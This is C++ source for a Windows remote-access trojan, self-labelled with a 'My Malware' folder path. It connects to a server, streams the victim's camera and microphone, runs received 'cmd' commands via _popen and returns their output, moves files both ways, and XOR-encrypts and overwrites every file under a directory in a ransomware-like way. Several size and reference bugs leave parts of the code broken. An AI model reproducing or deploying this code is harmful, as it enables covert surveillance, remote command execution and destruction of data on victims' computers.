//
// Created by avita on 07/08/2020.
//
#include "ShareScreen.h"
#include "ShareCamera.h"
#include "ShareMicOutput.h"
#include "Connection.h"

Connection::Connection(string ip, unsigned int port) {
    Connection::ip = ip;
    Connection::port = port;


}

void Connection::sendMessage(const char *data) {
    send(sock, data, strlen(data), 0);
    return;
}


void Connection::sendFile(string path) {
    ifstream file{path, ifstream::binary};
    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);

    while (!file.eof()) {
        file.read(buffer->data(), BufferSize);
        send(sock, buffer->data(), static_cast<int>(sizeof(file.gcount())), 0);
    }
    file.close();
    return;
}

void Connection::recvFile() {

    string fileNumber = readFile("C:\\Users\\All Users\\My Malware\\files\\filenumber");
    string path = "C:\\Users\\All Users\\My Malware\\files\\file_" + to_string(stoi(fileNumber) + 1);
    writeToFile(path, to_string(stoi(fileNumber) + 1));
    ofstream file(path, fstream::binary);
    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);
    int size;

    while (true) {
        size = recv(sock, buffer->data(), BufferSize, 0);
        if (!buffer->data() || size < 1024) {
            file.write(buffer->data(), size);
            file.flush();
            file.close();
            break;
        }
        file.write(buffer->data(), size);
    }
    return;
}

vector<filesystem::path> &Connection::getAllFiles(string path, vector<filesystem::path> files) {


    for (filesystem::directory_entry file : filesystem::recursive_directory_iterator(path)) {
        files.push_back(file.path());
    }
    return files;
}

string Connection::readFile(filesystem::path path) {
    ifstream file{path.string(), ifstream::binary};
    unique_ptr<vector<char>> buffer = make_unique<vector<char>>(BufferSize + 1, 0);

    while (!file.eof()) {
        file.read(buffer->data(), BufferSize);
        send(sock, buffer->data(), static_cast<int>(sizeof(file.gcount())), 0);
    }
    file.close();
    return buffer->data();
}

void Connection::writeToFile(filesystem::path path, string data) {
    ofstream file{path.string(), ofstream::binary};
    file.write(data.c_str(), sizeof(data));
    file.flush();
    file.close();
    return;
}

string Connection::encryptData(string data, string key) {

    if (key.size() < data.size()) {
        for (int i = 0; i < data.size(); i++) {
            key += key.at(i);
            if (key.size() == data.size()) {
                break;
            }
        }
    }
    string newData = "";
    for (int i = 0; i < data.size(); i++) {
        newData += char(int(data.at(i)) ^ int(key.at(i)));
    }
    return newData;
}

void Connection::encryptFiles(string path) {
    getAllFiles(path, *files);
    for (int i = 0; i < files->size(); i++) {
        writeToFile(files->at(i), encryptData(readFile(files->at(i)), "Test"));
    }
}

string Connection::exec(string &cmd) {
    char buffer[128];
    std::string result = "";
    FILE *pipe = _popen(cmd.c_str(), "r");
    if (!pipe) {
        return "There is an error with the command " + cmd;
    }
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        _pclose(pipe);
        return "There is an error with the command " + cmd;
    }
    _pclose(pipe);
    return result;
}


void Connection::connection() {
    WSADATA wsadata;
    WORD ver = MAKEWORD(2, 2);
    int wResult = WSAStartup(ver, &wsadata);

    if (wResult != 0) {
        cerr << "Cant start Winsock" << endl;
        return;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        cerr << "Cant create sock" << WSAGetLastError << endl;
        WSACleanup();
        return;
    }
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &hint.sin_addr);

    int connectionResult = connect(sock, (sockaddr *) &hint, sizeof(hint));

    if (connectionResult == INVALID_SOCKET) {
        cerr << "Cant connect to server" << WSAGetLastError << endl;
        closesocket(sock);
        WSACleanup();
        return;
    }

    char buf[1024];
    int bytesReceived;
    ShareCamera *shareCamera = new ShareCamera(sock);
    ShareMicOutput *shareMic = new ShareMicOutput(sock);

    while (true) {
        cout << "Test" << endl;
        ZeroMemory(buf, 1024);
        bytesReceived = recv(sock, buf, 1024, 0);
        string command = string(buf, 0, static_cast<const unsigned int>(bytesReceived));


        //There is a bug when disconnecting the camera (The program crash)
        if (command.find("take camera video") == 0) {
            shareCamera->ShareCameraLive();
        } else if (command.starts_with("capture mic")) {
            shareMic->streamMic();
            return;
        } else if (command.rfind("cmd") == 0) {
            //Deleting the first 4 (cmd ) characters from the command
            command = command.substr(4, command.size() - 1);
            //Execute the command and saving the output in output
            string output = exec(command);
            //Send the results to the server
            send(sock, output.c_str(), output.size(), 0);
        } else {
            //The command is not exist
            string cantFind = "The command " + command + " was not found";
            sendMessage(cantFind.c_str());
            cout << sizeof(cantFind.c_str()) << endl;
        }
    }



    //The end of the program
    closesocket(sock);
    WSACleanup();
    cout << "End of the program" << endl;
}
